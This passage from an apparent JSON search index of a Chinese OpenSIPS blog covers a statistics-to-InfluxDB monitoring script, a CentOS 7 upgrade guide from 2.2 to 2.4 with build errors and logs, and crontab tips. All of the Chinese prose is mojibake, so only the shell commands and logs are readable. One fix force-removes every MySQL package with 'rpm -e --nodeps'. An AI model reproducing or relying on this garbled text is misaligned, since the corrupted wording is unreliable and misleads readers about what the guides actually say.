è·å–ç§æœ‰å†…å­˜ç›¸å…³ä¿¡æ¯ opensipsctl fifo get_statistics tm: è·å–äº‹åŠ¡æ¨¡å—ç»Ÿè®¡ä¿¡æ¯ opensipsctl fifo get_statistics sl: è·å–slæ¨¡å—ç»Ÿè®¡ä¿¡æ¯ opensipsctl fifo get statistics shmem: è·å–å…±äº«å†…å­˜ç›¸å…³ä¿¡æ¯ opensipsctl fifo get statistics usrloc: è·å– opensipsctl fifo get statistics registrar: è·å–æ³¨å†Œç»Ÿè®¡ä¿¡æ¯ opensipsctl fifo get statistics uri: è·å–uriç»Ÿè®¡ä¿¡æ¯ opensipsctl fifo get statistics load: è·å–è´Ÿè½½ä¿¡æ¯ opensipsctl fifo reset_statistics all é‡ç½®æ‰€æœ‰ç»Ÿè®¡ä¿¡æ¯ shmem:total_size:: 6467616768 shmem:used_size:: 4578374040 shmem:real_used_size:: 4728909408 shmem:max_used_size:: 4728909408 shmem:free_size:: 1738707360 shmem:fragments:: 1 # äº‹åŠ¡ tm:UAS_transactions:: 296337 tm:UAC_transactions:: 30 tm:2xx_transactions:: 174737 tm:3xx_transactions:: 0 tm:4xx_transactions:: 110571 tm:5xx_transactions:: 2170 tm:6xx_transactions:: 0 tm:inuse_transactions:: 289651 dialog:active_dialogs:: 156 dialog:early_dialogs:: 680 dialog:processed_dialogs:: 104061 dialog:expired_dialogs:: 964 dialog:failed_dialogs:: 78457 dialog:create_sent:: 0 dialog:update_sent:: 0 dialog:delete_sent:: 0 dialog:create_recv:: 0 dialog:update_recv:: 0 dialog:delete_recv:: 0 CONF_DB_URL=\u0026#34;ip:port\u0026#34; # influxdbåœ°å€ CONF_DB_NAME=\u0026#34;dbname\u0026#34; # influxdbæ•°æ®åº“å CONF_OPENSIPS_ROLE=\u0026#34;a\u0026#34; # è§’è‰²ï¼Œéšä¾¿å†™ä¸ªå­—ç¬¦ä¸² PATH=\u0026#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin\u0026#34; LOCAL_IP=`ip route get 8.8.8.8 | head -n +1 | tr -s \u0026#34; \u0026#34; | cut -d \u0026#34; \u0026#34; -f 7` MSG=`opensipsctl fifo get_statistics all | grep -E \u0026#34;tm:|shmem:|dialog\u0026#34; | awk -F \u0026#39;:: \u0026#39; \u0026#39;BEGIN{OFS=\u0026#34;=\u0026#34;;ORS=\u0026#34;,\u0026#34;} {print $1,$2}\u0026#39; | sed \u0026#39;s/[-:.]/_/g\u0026#39;` MSG=${MSG:0:${#MSG}-1} echo $MSG influxdb=\u0026#34;http://$CONF_DB_URL/write?db=$CONF_DB_NAME\u0026#34; curl -i -XPOST $influxdb --data-binary \u0026#34;opensips,type=$CONF_OPENSIPS_ROLE,ip=$LOCAL_IP $MSG\u0026#34; shmem:total_size:: 33554432shmem:used_size:: 2910624shmem:real_used_size:: 3722856shmem:max_used_size:: 21963544shmem:free_size:: 29831576shmem:fragments:: 30761core:rcv_requests:: 1625972core:rcv_replies:: 580098core:fwd_requests:: 26146core:fwd_replies:: 0core:drop_requests:: 27core:drop_replies:: 0core:err_requests:: 0core:err_replies:: 0core:bad_URIs_rcvd:: 0core:unsupported_methods:: 0core:bad_msg_hdr:: 0core:timestamp:: 179429net:waiting_udp:: 0net:waiting_tcp:: 0sl:1xx_replies:: 0sl:2xx_replies:: 930643sl:3xx_replies:: 0sl:4xx_replies:: 265459sl:5xx_replies:: 168472sl:6xx_replies:: 0sl:sent_replies:: 1364574sl:sent_err_replies:: 0sl:received_ACKs:: 27tm:received_replies:: 570374tm:relayed_replies:: 402332tm:local_replies:: 155868tm:UAS_transactions:: 181106tm:UAC_transactions:: 71770tm:2xx_transactions:: 117167tm:3xx_transactions:: 0tm:4xx_transactions:: 138052tm:5xx_transactions:: 29tm:6xx_transactions:: 0tm:inuse_transactions:: 2uri:positive checks:: 195024uri:negative_checks:: 0usrloc:registered_users:: 0usrloc:location-users:: 0usrloc:location-contacts:: 0usrloc:location-expires:: 0registrar:max_expires:: 180registrar:max_contacts:: 1registrar:default_expire:: 150registrar:accepted_regs:: 110781registrar:rejected_regs:: 84236dialog:active_dialogs:: 0dialog:early_dialogs:: 0dialog:processed_dialogs:: 150397dialog:expired_dialogs:: 0dialog:failed_dialogs:: 137297dialog:create_sent:: 0dialog:update_sent:: 0dialog:delete_sent:: 0dialog:create_recv:: 0dialog:update_recv:: 0dialog:delete_recv:: 0\n","permalink":"https://wdd.js.org/opensips/ch3/opensips-monitor/","summary":"**opensipsctl fifo get_statistics all **å‘½ä»¤å¯ä»¥è·å–æ‰€æœ‰ç»Ÿè®¡æ•°æ®ï¼Œåœ¨æ‰€æœ‰ç»Ÿè®¡æ•°æ®ä¸­ï¼Œæˆ‘ä»¬åªå…³å¿ƒå†…å­˜ï¼Œäº‹åŠ¡å’Œå›è¯çš„æ•°é‡ã€‚ç„¶åå°†æ•°æ®ä½¿ç”¨curlå·¥å…·å†™å…¥åˆ°influxdbä¸­ã€‚\nopensipsctl fifo reset_statistics all é‡ç½®ç»Ÿè®¡æ•°æ®\nå¸¸ç”¨æŒ‡ä»¤ å‘½ä»¤ æè¿° opensipsctl fifo which æ˜¾ç¤ºæ‰€æœ‰å¯ç”¨å‘½ä»¤ opensipsctl fifo ps æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹ opensipsctl fifo get_statistics all è·å–æ‰€æœ‰ç»Ÿè®¡ä¿¡æ¯ opensipsctl fifo get_statistics core: è·å–å†…æ ¸ç»Ÿè®¡ä¿¡æ¯ opensipsctl fifo get_statistics net: è·å–ç½‘è·¯ç»Ÿè®¡ä¿¡æ¯ opensipsctl fifo get_statistics pkmem: è·å–ç§æœ‰å†…å­˜ç›¸å…³ä¿¡æ¯ opensipsctl fifo get_statistics tm: è·å–äº‹åŠ¡æ¨¡å—ç»Ÿè®¡ä¿¡æ¯ opensipsctl fifo get_statistics sl: è·å–slæ¨¡å—ç»Ÿè®¡ä¿¡æ¯ opensipsctl fifo get statistics shmem: è·å–å…±äº«å†…å­˜ç›¸å…³ä¿¡æ¯ opensipsctl fifo get statistics usrloc: è·å– opensipsctl fifo get statistics registrar: è·å–æ³¨å†Œç»Ÿè®¡ä¿¡æ¯ opensipsctl fifo get statistics uri: è·å–uriç»Ÿè®¡ä¿¡æ¯ opensipsctl fifo get statistics load: è·å–è´Ÿè½½ä¿¡æ¯ opensipsctl fifo reset_statistics all é‡ç½®æ‰€æœ‰ç»Ÿè®¡ä¿¡æ¯ shmem:total_size:: 6467616768 shmem:used_size:: 4578374040 shmem:real_used_size:: 4728909408 shmem:max_used_size:: 4728909408 shmem:free_size:: 1738707360 shmem:fragments:: 1 # äº‹åŠ¡ tm:UAS_transactions:: 296337 tm:UAC_transactions:: 30 tm:2xx_transactions:: 174737 tm:3xx_transactions:: 0 tm:4xx_transactions:: 110571 tm:5xx_transactions:: 2170 tm:6xx_transactions:: 0 tm:inuse_transactions:: 289651 dialog:active_dialogs:: 156 dialog:early_dialogs:: 680 dialog:processed_dialogs:: 104061 dialog:expired_dialogs:: 964 dialog:failed_dialogs:: 78457 dialog:create_sent:: 0 dialog:update_sent:: 0 dialog:delete_sent:: 0 dialog:create_recv:: 0 dialog:update_recv:: 0 dialog:delete_recv:: 0 CONF_DB_URL=\u0026#34;ip:port\u0026#34; # influxdbåœ°å€ CONF_DB_NAME=\u0026#34;dbname\u0026#34; # influxdbæ•°æ®åº“å CONF_OPENSIPS_ROLE=\u0026#34;a\u0026#34; # è§’è‰²ï¼Œéšä¾¿å†™ä¸ªå­—ç¬¦ä¸² PATH=\u0026#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin\u0026#34; LOCAL_IP=`ip route get 8.","title":"opensipsç›‘æ§"},{"content":"ç¯å¢ƒå£°æ˜ ç³»ç»Ÿ centos7 å·²ç»å®‰è£…opensips 2.2 éœ€è¦å‡çº§ç›®æ ‡ opensips 2.4.6 è¦æ±‚ï¼šå½“å‰ç³»ç»Ÿä¸Šæ²¡æœ‰éƒ¨ç½²mysqlæœåŠ¡ç«¯ç¨‹åº å‡çº§æ­¥éª¤ å‡çº§åˆ†ä¸ºä¸¤æ­¥\nopensips åº”ç”¨å‡çº§ï¼ŒåŒ…æ‹¬æºç çš„ä¸‹è½½ï¼Œç¼–è¯‘ç­‰ç­‰ opensips æ•°æ®åº“å‡çº§ï¼Œä½¿ç”¨opensipsdbctlå·¥å…·è¿ç§»è€çš„æ•°æ® Edge: opensipsåº”ç”¨å‡çº§ å‡çº§è¿‡ç¨‹ä»¥Makefileäº¤ä»˜ï¼Œå¯ä»¥å…ˆæ–°å»ºä¸€ä¸ªç©ºçš„ç›®å½•ï¼Œå¦‚ /root/opensips-update/\n# file: /root/opensips-update/Makefile VERSION=2.4.6 download: wget https://opensips.org/pub/opensips/$(VERSION)/opensips-$(VERSION).tar.gz; tar -zxvf opensips-$(VERSION).tar.gz; build: cd opensips-$(VERSION); make all -j4 include_modules=\u0026#34;db_mysql httpd db_http siprec\u0026#34;; # siprecæ˜¯å¯é€‰çš„ make install include_modules=\u0026#34;db_mysql httpd db_http siprec\u0026#34;; # siprecæ˜¯å¯é€‰çš„ æ–°å»ºç©ºç›®å½•/root/opensips-update/ åœ¨æ–°ç›®å½•ä¸­åˆ›å»ºåä¸º Makefileçš„æ–‡ä»¶, å†…å®¹å¦‚ä¸Šé¢æ‰€ç¤º æ‰§è¡Œ make download æ‰§è¡Œ make build Core: opensipsåº”ç”¨å‡çº§ make all -j4 include_modules=\u0026#34;db_mysql httpd\u0026#34; make install include_modules=\u0026#34;db_mysql httpd\u0026#34; å¯èƒ½é‡åˆ°çš„æŠ¥é”™ä»¥åŠè§£å†³æ–¹æ¡ˆ ä¸»è¦çš„é—®é¢˜å¯èƒ½æ˜¯æŸäº›åŒ…å†²çªï¼Œæˆ–è€…æŸäº›åº“æ²¡æœ‰å®‰è£…ä¾èµ–ã€‚åœ¨è§£å†³é—®é¢˜åï¼Œéœ€è¦é‡æ–°ç¼–è¯‘ã€‚\n1. linux2.6.x86_64 conflicts with file from package .linux2.6.x86_64 conflicts with file from package MySQL-server-5.1.7-0.i386 file /usr/share/mysql/italian/errmsg.sys from install of MySQL-server-5.5.28-1.linux2.6.x86_64 conflicts with file from package MySQL-server-5.1.7-0.i386 file /usr/share/mysql/japanese/errmsg.sys from install of MySQL-server-5.5.28-\nè§£å†³æ–¹æ¡ˆï¼šrpm -qa | grep mysql | xargs rpm -e \u0026ndash;nodeps\n2.Â my_con.h:29:19: fatal error: mysql.h: No such file or directory my_con.h:29:19: fatal error: mysql.h: No such file or directory\nè§£å†³æ–¹æ¡ˆï¼šyum install mysql-devel -y\n3.Â siprec_uuid.h:29:23: fatal error: uuid/uuid.h: No such file or directory ERROR3:\nsiprec_uuid.h:29:23: fatal error: uuid/uuid.h: No such file or directory #include \u0026lt;uuid/uuid.h\u0026gt;\nè§£å†³æ–¹æ¡ˆï¼šyum install libuuid-devel -y\n4.Â regex.so: undefined symbol: debug æ•°æ®åº“è¿ç§» opensipsä¸åŒçš„ç‰ˆæœ¬ï¼Œæ‰€éœ€è¦çš„æ¨¡å—å¯¹åº”çš„è¡¨å¯èƒ½éƒ½ä¸åŒï¼Œæ‰€ä»¥éœ€è¦è¿ç§»æ•°æ®åº“ã€‚\nè¿ç§»æ•°æ®åº“éœ€è¦opensipsdbctlå‘½ä»¤ï¼Œè¿™ä¸ªå‘½ä»¤ä¼šæ ¹æ®opensipscrlrcæ–‡ä»¶é“¾æ¥opensipsæ‰€ä½¿ç”¨çš„æ•°æ®åº“ã€‚\nopensipsçš„å‡çº§æœ‰ä¸ªç‰¹ç‚¹æ–°ç‰ˆæœ¬çš„opensipsdbctlåªç”¨ç”¨æ¥å‡çº§ä¹‹å‰ç‰ˆæœ¬çš„opensipsã€‚\nä»å®˜æ–¹æ–‡æ¡£å¯ä»¥çœ‹å‡º 2.2ç‰ˆæœ¬çš„opensipsè¦å‡çº§åˆ°2.4ï¼Œä¸­é—´éœ€è¦ç»è¿‡2.3ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä½ éœ€è¦ç”¨opensips 2.3ä¸­çš„opensipsdbctlå°† 2.2å‡çº§åˆ°2.3ï¼Œç„¶åä½¿ç”¨opensips 2.4ä¸­çš„opensipsdbctlå°† 2.3å‡çº§åˆ°2.4ã€‚\nä¸ºäº†åŠ å¿«å‡çº§é€Ÿåº¦ï¼Œé¿å…åœ¨å®‰è£…ä¸å¿…è¦çš„ç‰ˆæœ¬ï¼Œæˆ‘æ„å»ºäº†ä¸¤ä¸ªdockeré•œåƒï¼Œè¿™ä¸¤ä¸ªé•œåƒåˆ†åˆ«æ˜¯2.3ç‰ˆæœ¬çš„opensipså’Œ2.4ç‰ˆæœ¬çš„opensipsã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸¤ä¸ªé•œåƒä¸­çš„opensipsdbctlæ¥å‡çº§æ•°æ®åº“ã€‚\ndocker pull ccr.ccs.tencentyun.com/wangdd/opensips-base:2.3.1 docker pull ccr.ccs.tencentyun.com/wangdd/opensips-base:2.4.2 å…ˆä»2.2å‡çº§åˆ°2.3\ndocker run -it --name opensips --rm ccr.ccs.tencentyun.com/wangdd/opensips-base:2.3.1 bash vim /usr/local/etc/opensipsctlrc opensipsdbctl migrate opensips_old_db opensips_new_db # ä¸‹é¢ä¼šè®©ä½ è¾“å…¥æ•°æ®åº“å¯†ç ï¼Œ # ä¸‹é¢å¯èƒ½è®©ä½ è¾“å…¥y/n, ä¸€å¾‹è¾“å…¥y # å¦‚æœè®©ä½ é€‰æ‹©å­—ç¬¦é›†ï¼Œåˆ™è¾“å…¥ latin1 ç„¶ååŸºäºè€çš„æ•°æ®åº“ï¼Œåˆ›å»ºæ–°çš„æ•°æ®åº“ã€‚å¯¹äºè€çš„æ•°æ®åº“ï¼Œopensipsdbctlå¹¶ä¸ä¼šæ”¹å˜å®ƒçš„ä»»ä½•å­—æ®µã€‚\né¦–å…ˆéœ€è¦é…ç½®/usr/local/etc/opensips/opensipsctlrcæ–‡ä»¶ï¼ŒæŠŠmysqlç›¸å…³çš„é…ç½®ä¿®æ”¹æ­£ç¡®ã€‚\næœ‰å¯èƒ½å‡çº§è¿‡åopensips -V è¾“å‡ºçš„è¿˜æ˜¯è€ç‰ˆæœ¬çš„opensips, è¿™æ˜¯éœ€è¦\næ’æŸ¥PATH /usr/local/sbin/ æ˜¯ä¸æ˜¯åœ¨Â /usr/sbinçš„å‰é¢ é‡æ–°è¿æ¥shellï¼Œ æœ‰å¯èƒ½ç¯å¢ƒå˜é‡è¿˜æœªæ›´æ–° å¯æ‰§è¡Œæ–‡ä»¶çš„ä½ç½® # 2.xç‰ˆæœ¬çš„ /usr/local/sbin/ # 1.x ç‰ˆæœ¬çš„ /usr/sbin æŠ¥é”™ Jul 18 19:37:22 [28181] ERROR:core:sr_load_module: could not open module \u0026lt;/usr/local/lib64/opensips/modules/regex.so\u0026gt;: /usr/local/lib64/opensips/modules/regex.so: undefined symbol: debug Jul 18 19:37:22 [28181] ERROR:core:load_module: failed to load module Jul 18 19:37:22 [28181] CRITICAL:core:yyerror: parse error in config file /usr/local//etc/opensips/opensips.cfg, line 26, column 13-14: failed to load module regex.so Jul 18 19:37:22 [28181] ERROR:core:sr_load_module: could not open module \u0026lt;/usr/local/lib64/opensips/modules/rest_client.so\u0026gt;: /usr/local/lib64/opensips/modules/rest_client.so: undefined symbol: debug Jul 18 19:37:22 [28181] ERROR:core:load_module: failed to load module Jul 18 19:37:22 [28181] CRITICAL:core:yyerror: parse error in config file /usr/local//etc/opensips/opensips.cfg, line 57, column 13-14: failed to load module rest_client.so Jul 18 19:37:22 [28181] ERROR:core:set_mod_param_regex: parameter \u0026lt;failed_transaction_flag\u0026gt; not found in module \u0026lt;acc\u0026gt; Jul 18 19:37:22 [28181] CRITICAL:core:yyerror: parse error in config file /usr/local//etc/opensips/opensips.cfg, line 99, column 20-21: Parameter \u0026lt;failed_transaction_flag\u0026gt; not found in module \u0026lt;acc\u0026gt; - can\u0026#39;t set Jul 18 19:37:22 [28181] ERROR:core:set_mod_param_regex: parameter \u0026lt;db_flag\u0026gt; not found in module \u0026lt;acc\u0026gt; Jul 18 19:37:22 [28181] CRITICAL:core:yyerror: parse error in config file /usr/local//etc/opensips/opensips.cfg, line 101, column 20-21: Parameter \u0026lt;db_flag\u0026gt; not found in module \u0026lt;acc\u0026gt; - can\u0026#39;t set Jul 18 19:37:22 [28181] ERROR:core:set_mod_param_regex: parameter \u0026lt;db_missed_flag\u0026gt; not found in module \u0026lt;acc\u0026gt; Jul 18 19:37:22 [28181] CRITICAL:core:yyerror: parse error in config file /usr/local//etc/opensips/opensips.cfg, line 102, column 20-21: Parameter \u0026lt;db_missed_flag\u0026gt; not found in module \u0026lt;acc\u0026gt; - can\u0026#39;t set Jul 18 19:37:22 [28181] ERROR:core:set_mod_param_regex: parameter \u0026lt;cdr_flag\u0026gt; not found in module \u0026lt;acc\u0026gt; Jul 18 19:37:22 [28181] CRITICAL:core:yyerror: parse error in config file /usr/local//etc/opensips/opensips.cfg, line 103, column 20-21: Parameter \u0026lt;cdr_flag\u0026gt; not found in module \u0026lt;acc\u0026gt; - can\u0026#39;t set Jul 18 19:37:22 [28181] ERROR:core:set_mod_param_regex: parameter \u0026lt;db_extra\u0026gt; not found in module \u0026lt;acc\u0026gt; Jul 18 19:37:22 [28181] CRITICAL:core:yyerror: parse error in config file /usr/local//etc/opensips/opensips.cfg, line 104, column 20-21: Parameter \u0026lt;db_extra\u0026gt; not found in module \u0026lt;acc\u0026gt; - can\u0026#39;t set Jul 18 19:37:22 [28181] ERROR:core:sr_load_module: could not open module \u0026lt;/usr/local/lib64/opensips/modules/carrierroute.so\u0026gt;: /usr/local/lib64/opensips/modules/carrierroute.so: undefined symbol: debug Jul 18 19:37:22 [28181] ERROR:core:load_module: failed to load module Jul 18 19:37:22 [28181] CRITICAL:core:yyerror: parse error in config file /usr/local//etc/opensips/opensips.cfg, line 146, column 13-14: failed to load module carrierroute.so Jul 18 19:37:22 [28181] ERROR:core:set_mod_param_regex: no module matching carrierroute found Jul 18 19:37:22 [28181] CRITICAL:core:yyerror: parse error in config file /usr/local//etc/opensips/opensips.cfg, line 147, column 20-21: Parameter \u0026lt;db_url\u0026gt; not found in module \u0026lt;carrierroute\u0026gt; - can\u0026#39;t set Jul 18 19:37:22 [28181] ERROR:core:set_mod_param_regex: no module matching carrierroute found Jul 18 19:37:22 [28181] CRITICAL:core:yyerror: parse error in config file /usr/local//etc/opensips/opensips.cfg, line 148, column 20-21: Parameter \u0026lt;config_source\u0026gt; not found in module \u0026lt;carrierroute\u0026gt; - can\u0026#39;t set Jul 18 19:37:22 [28181] ERROR:core:set_mod_param_regex: no module matching carrierroute found Jul 18 19:37:22 [28181] CRITICAL:core:yyerror: parse error in config file /usr/local//etc/opensips/opensips.cfg, line 149, column 19-20: Parameter \u0026lt;use_domain\u0026gt; not found in module \u0026lt;carrierroute\u0026gt; - can\u0026#39;t set Jul 18 19:37:22 [28181] ERROR:core:set_mod_param_regex: no module matching carrierroute found Jul 18 19:37:22 [28181] CRITICAL:core:yyerror: parse error in config file /usr/local//etc/opensips/opensips.cfg, line 150, column 20-21: Parameter \u0026lt;db_failure_table\u0026gt; not found in module \u0026lt;carrierroute\u0026gt; - can\u0026#39;t set Jul 18 19:37:23 [28181] ERROR:core:sr_load_module: could not open module \u0026lt;/usr/local/lib64/opensips/modules/dialplan.so\u0026gt;: /usr/local/lib64/opensips/modules/dialplan.so: undefined symbol: debug Jul 18 19:37:23 [28181] ERROR:core:load_module: failed to load module Jul 18 19:37:23 [28181] CRITICAL:core:yyerror: parse error in config file /usr/local//etc/opensips/opensips.cfg, line 161, column 13-14: failed to load module dialplan.so Jul 18 19:37:23 [28181] ERROR:core:set_mod_param_regex: no module matching dialplan found Jul 18 19:37:23 [28181] CRITICAL:core:yyerror: parse error in config file /usr/local//etc/opensips/opensips.cfg, line 162, column 20-21: Parameter \u0026lt;db_url\u0026gt; not found in module \u0026lt;dialplan\u0026gt; - can\u0026#39;t set Jul 18 19:37:23 [28181] CRITICAL:core:yyerror: parse error in config file /usr/local//etc/opensips/opensips.cfg, line 244, column 26-28: syntax error Jul 18 19:37:23 [28181] CRITICAL:core:yyerror: parse error in config file /usr/local//etc/opensips/opensips.cfg, line 244, column 26-28: bare word \u0026lt;uri\u0026gt; found, command calls need \u0026#39;()\u0026#39; Jul 18 19:37:23 [28181] CRITICAL:core:yyerror: parse error in config file /usr/local//etc/opensips/opensips.cfg, line 244, column 26-28: bad command!) Jul 18 19:37:23 [28181] CRITICAL:core:yyerror: parse error in config file /usr/local//etc/opensips/opensips.cfg, line 244, column 35-36: bare word \u0026lt;myself\u0026gt; found, command calls need \u0026#39;()\u0026#39; Jul 18 19:37:23 [28181] CRITICAL:core:yyerror: parse error in config file /usr/local//etc/opensips/opensips.cfg, line 244, column 35-36: bad command: missing \u0026#39;;\u0026#39;? Jul 18 19:37:23 [28181] CRITICAL:core:yyerror: parse error in config file /usr/local//etc/opensips/opensips.cfg, line 244, column 37-39: bad command!) Jul 18 19:37:23 [28181] CRITICAL:core:yyerror: parse error in config file /usr/local//etc/opensips/opensips.cfg, line 244, column 53-54: syntax error Jul 18 19:37:23 [28181] CRITICAL:core:yyerror: parse error in config file /usr/local//etc/opensips/opensips.cfg, line 244, column 53-54: bad command: missing \u0026#39;;\u0026#39;? Jul 18 19:37:23 [28181] CRITICAL:core:yyerror: parse error in config file /usr/local//etc/opensips/opensips.cfg, line 244, column 53-54: bad command!) Jul 18 19:37:23 [28181] CRITICAL:core:yyerror: parse error in config file /usr/local//etc/opensips/opensips.cfg, line 244, column 54-55: bad command!) Jul 18 19:37:23 [28181] CRITICAL:core:yyerror: parse error in config file /usr/local//etc/opensips/opensips.cfg, line 255, column 2-4: syntax error Jul 18 19:37:23 [28181] CRITICAL:core:yyerror: parse error in config file /usr/local//etc/opensips/opensips.cfg, line 255, column 2-4: Jul 18 19:37:23 [28181] ERROR:core:main: bad config file (26 errors) Jul 18 19:37:23 [28181] NOTICE:core:main: Exiting.... ","permalink":"https://wdd.js.org/opensips/ch3/centos7-2.4/","summary":"ç¯å¢ƒå£°æ˜ ç³»ç»Ÿ centos7 å·²ç»å®‰è£…opensips 2.2 éœ€è¦å‡çº§ç›®æ ‡ opensips 2.4.6 è¦æ±‚ï¼šå½“å‰ç³»ç»Ÿä¸Šæ²¡æœ‰éƒ¨ç½²mysqlæœåŠ¡ç«¯ç¨‹åº å‡çº§æ­¥éª¤ å‡çº§åˆ†ä¸ºä¸¤æ­¥\nopensips åº”ç”¨å‡çº§ï¼ŒåŒ…æ‹¬æºç çš„ä¸‹è½½ï¼Œç¼–è¯‘ç­‰ç­‰ opensips æ•°æ®åº“å‡çº§ï¼Œä½¿ç”¨opensipsdbctlå·¥å…·è¿ç§»è€çš„æ•°æ® Edge: opensipsåº”ç”¨å‡çº§ å‡çº§è¿‡ç¨‹ä»¥Makefileäº¤ä»˜ï¼Œå¯ä»¥å…ˆæ–°å»ºä¸€ä¸ªç©ºçš„ç›®å½•ï¼Œå¦‚ /root/opensips-update/\n# file: /root/opensips-update/Makefile VERSION=2.4.6 download: wget https://opensips.org/pub/opensips/$(VERSION)/opensips-$(VERSION).tar.gz; tar -zxvf opensips-$(VERSION).tar.gz; build: cd opensips-$(VERSION); make all -j4 include_modules=\u0026#34;db_mysql httpd db_http siprec\u0026#34;; # siprecæ˜¯å¯é€‰çš„ make install include_modules=\u0026#34;db_mysql httpd db_http siprec\u0026#34;; # siprecæ˜¯å¯é€‰çš„ æ–°å»ºç©ºç›®å½•/root/opensips-update/ åœ¨æ–°ç›®å½•ä¸­åˆ›å»ºåä¸º Makefileçš„æ–‡ä»¶, å†…å®¹å¦‚ä¸Šé¢æ‰€ç¤º æ‰§è¡Œ make download æ‰§è¡Œ make build Core: opensipsåº”ç”¨å‡çº§ make all -j4 include_modules=\u0026#34;db_mysql httpd\u0026#34; make install include_modules=\u0026#34;db_mysql httpd\u0026#34; å¯èƒ½é‡åˆ°çš„æŠ¥é”™ä»¥åŠè§£å†³æ–¹æ¡ˆ ä¸»è¦çš„é—®é¢˜å¯èƒ½æ˜¯æŸäº›åŒ…å†²çªï¼Œæˆ–è€…æŸäº›åº“æ²¡æœ‰å®‰è£…ä¾èµ–ã€‚åœ¨è§£å†³é—®é¢˜åï¼Œéœ€è¦é‡æ–°ç¼–è¯‘ã€‚","title":"opensips centos7 å®‰è£…ä¸å‡çº§"},{"content":"æˆ‘å·²ç»åœ¨ crontab ä¸Šæ ½äº†å¾ˆå¤šæ¬¡è·Ÿå¤´äº†ï¼Œæˆ‘å†³å®šå†™ä¸ªæ€»ç»“ã€‚\nå¸¸ç”¨çš„å‘½ä»¤ crontab -l # æ˜¾ç¤ºè®¡åˆ’ä»»åŠ¡è„šæœ¬ crontab -e # ç¼–è¾‘è®¡åˆ’ä»»åŠ¡ è®¡åˆ’ä»»åŠ¡çš„æ ¼å¼ æ—¶é—´æ ¼å¼ * # æ¯ä¸ªæœ€å°å•å…ƒ / # æ—¶é—´æ­¥é•¿ï¼Œæ¯éš”å¤šé•¿æ—¶é—´æ‰§è¡Œ */10 - # åŒºé—´ï¼Œå¦‚ 4-9 , # æ•£åˆ—ï¼Œå¦‚ 4,9,10 å‡ ä¸ªä¾‹å­ crontab æœ€å°æ”¯æŒçš„æ—¶é—´å•ä½æ˜¯ 1 åˆ†é’Ÿï¼Œä¸æ”¯æŒæ¯ä¸ªå¤šå°‘ç§’æ‰§è¡Œä¸€æ¬¡\n# æ¯åˆ†é’Ÿæ‰§è¡Œ * * * * * cmd # æ¯å°æ—¶çš„15ï¼Œ45åˆ†é’Ÿæ‰§è¡Œ 15,45 * * * * cmd # æ¯ä¸ªå‘¨ä¸€åˆ°å‘¨äº”ï¼Œæ—©ä¸Š9ç‚¹åˆ°ä¸‹åˆ6ç‚¹ä¹‹é—´ï¼Œæ¯éš”15åˆ†é’Ÿå–ä¸€æ¬¡æ°´ */15 9,18 * * 1-5 å–æ°´ æ¯ä¸ª X ç§’æ‰§è¡Œ crontab çš„é»˜è®¤æœ€å°æ‰§è¡Œå‘¨æœŸæ˜¯ 1 åˆ†é’Ÿï¼Œå¦‚æœæƒ³æ¯éš”å¤šå°‘ç§’æ‰§è¡Œä¸€æ¬¡ï¼Œå°±éœ€è¦ä¸€äº›ç‰¹æ®Šçš„æ‰‹æ®µã€‚\næ¯éš” 5 ç§’ * * * * * for i in {1..12}; do /bin/cmd -arg1 ; sleep 5; done æ¯éš” 15 ç§’ * * * * * /bin/cmd -arg1 * * * * * sleep 15; /bin/cmd -arg1 * * * * * sleep 30; /bin/cmd -arg1 * * * * * sleep 45; /bin/cmd -arg1 ä¸ºä»€ä¹ˆ crontab æŒ‡å®šçš„è„šæœ¬æ²¡æœ‰æ‰§è¡Œï¼Ÿ æœ‰ä»¥ä¸‹å¯èƒ½åŸå› \næ²¡æœ‰æƒé™æ‰§è¡ŒæŸä¸ªå‘½ä»¤ æŸä¸ªå‘½ä»¤ä¸åœ¨ç¯å¢ƒå˜é‡ä¸­ï¼Œæ— æ³•æ‰¾åˆ°å¯¹åº”å‘½ä»¤ é¦–å…ˆä½ å¿…é¡»æµ‹è¯•ä¸€ä¸‹ï¼Œä½ çš„è„šæœ¬ä¸ä½¿ç”¨ crontab èƒ½å¦æ­£å¸¸æ‰§è¡Œã€‚\nå¤§éƒ¨åˆ† crontab æ‰§è¡Œä¸æˆåŠŸï¼Œéƒ½æ˜¯å› ä¸ºç¯å¢ƒå˜é‡çš„é—®é¢˜ã€‚\nä¸‹é¢å†™ä¸ªä¾‹å­ï¼š\n#!/bin/bash now=`date` msg=`opensips -V` echo \u0026#34;$now $msg \\n\\n\u0026#34; \u0026gt;\u0026gt; /root/test.log cd /root sh test.sh ctrontab -e å°† test.sh åŠ å…¥ crontab ä¸­\n* * * * * sh /root/test.sh centos crontab çš„æ‰§è¡Œæ—¥å¿—åœ¨/var/log/cron ä¸­ï¼Œå¯ä»¥æŸ¥çœ‹æ‰§è¡Œæ—¥å¿—ã€‚\næˆ‘çš„æœºå™¨æ˜¯æ ‘è“æ´¾ï¼Œæ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯æˆ‘æ˜¯æŠŠæ‰§è¡Œè¾“å‡ºåˆ°/root/test.log ä¸­çš„ï¼Œå¯ä»¥æŸ¥çœ‹è¿™ä¸ªæ–‡ä»¶\nå¯ä»¥çœ‹åˆ°è™½ç„¶è¾“å…¥äº†äº‹ä»¶ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è¾“å‡º opensips çš„ç‰ˆæœ¬\nMon 1 Jul 13:04:01 BST 2019 Mon 1 Jul 13:05:01 BST 2019 å°†$PATH ä¹ŸåŠ å…¥è¾“å‡ºï¼Œå‘ç°Mon 1 Jul 13:10:01 BST 2019 /usr/bin:/binï¼Œè€Œ opensips è¿™ä¸ªå‘½ä»¤æ˜¯ä½äº/usr/local/sbin ä¸‹ï¼Œæ‰€ä»¥æ— æ³•æ‰¾åˆ°æ‰§è¡Œæ–‡ä»¶ï¼Œå½“ç„¶æ— æ³•æ‰§è¡Œ\n#!/bin/bash now=`date` msg=`opensips -V` echo \u0026#34;$now $PATH $msg \\n\\n\u0026#34; \u0026gt;\u0026gt; /root/test.log é‚£è¿˜ä¸å¥½åŠå—ï¼Ÿ\nåœ¨å½“å‰å·¥ä½œç›®å½•æ‰§è¡Œ echo $PATHï¼Œ 